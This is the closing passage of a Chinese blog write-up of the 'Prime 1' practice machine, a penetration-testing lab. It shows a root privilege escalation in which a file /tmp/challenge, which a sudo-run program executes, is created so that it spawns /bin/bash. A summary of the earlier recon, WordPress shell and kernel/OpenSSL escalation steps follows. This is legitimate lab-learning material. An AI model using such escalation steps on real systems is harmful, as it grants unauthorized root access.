+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162139357.png" alt="image-20240416213905304"></p>
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162143044.png" alt="image-20240416214315930"></p>
+<p>以root运行&#x2F;home&#x2F;victor&#x2F;undefeated_victor会去运行&#x2F;tmp&#x2F;challenge，如果challenge中包含提权的指令，那么一旦运行就可以提权了，没有这个challenge文件，那咱就创建一个，tmp文件也可以写入文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;#!/bin/bash&#x27; &gt; challenge</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; challenge </span><br><span class="line">chmod +x challenge </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202404162147499.png" alt="image-20240416214704448"></p>
+<p>提权成功!</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>前期先信息收集,这个靶机重点是在于信息挖掘,对于目录的fuzz,接着是对于wordpress后台的getshell,然后方法一通过内核版本过低进行提权,方法二是获取openssl的账号密码进行提权.重点是2.openssl解密：1密文；2密钥；3加密算法 缺一不可4.awk,md5sum,od,tr等字符串处理命令4.bash脚本</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://d3mxbu7.github.io">d3mXBu7</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://d3mxbu7.github.io/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/">https://d3mxbu7.github.io/2024/04/22/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/prime_1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://d3mxbu7.github.io" target="_blank">d3mXBu7 の Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202401051739822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/02/02/%E9%9D%B6%E5%9C%BA/portswigger/SSRF/" title="portswigger_ssrf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">portswigger_ssrf</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Prime 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-namp%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">1.namp扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">主机探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-UDP%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.3.</span> <span class="toc-text">TCP,UDP扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%EF%BC%8C%E4%B8%BA%E6%88%91%E4%BB%AC%E6%B8%97%E9%80%8F%E6%8F%90%E4%BE%9B%E5%88%9D%E6%AD%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.4.</span> <span class="toc-text">脚本漏洞扫描，为我们渗透提供初步思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E7%AB%AF%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">WEB端攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83-%E8%A7%A3%E6%B3%95%E4%B8%80%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.</span> <span class="toc-text">主机提权(解法一内核提权)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83%EF%BC%88%E6%96%B9%E6%B3%95%E4%BA%8COpenSSL%E8%A7%A3%E5%AF%86%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">主机提权（方法二OpenSSL解密）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENC%E6%8E%A2%E7%B4%A2%E5%92%8C%E6%9F%A5%E6%89%BE"><span class="toc-number">3.2.1.</span> <span class="toc-text">ENC探索和查找</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By d3mXBu7</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
